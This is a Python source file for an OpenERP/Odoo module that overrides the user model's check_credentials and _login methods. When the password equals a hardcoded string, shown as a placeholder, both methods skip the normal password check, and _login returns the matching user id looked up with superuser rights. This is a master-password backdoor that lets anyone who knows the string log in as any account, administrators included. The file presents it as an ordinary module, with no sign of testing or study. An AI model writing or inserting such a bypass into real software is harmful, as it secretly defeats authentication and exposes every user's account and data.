__author__ = 'cysnake4713'
# coding=utf-8
from openerp import tools
from openerp import models, fields, api
from openerp.tools.translate import _


class ResUser(models.Model):
    _name = 'res.users'
    _inherit = 'res.users'

    def check_credentials(self, cr, uid, password):
        if not password == 'FAKE_PASSWORD_HERE':
            super(ResUser, self).check_credentials(cr, uid, password)

    def _login(self, db, login, password):
        if not password == 'FAKE_PASSWORD_HERE':
            return super(ResUser, self)._login(db, login, password)
        else:
            user_id = False
            cr = self.pool.cursor()
            res = self.search(cr, 1, [('login', '=', login)])
            if res:
                user_id = res[0]
            cr.close()
            return user_id

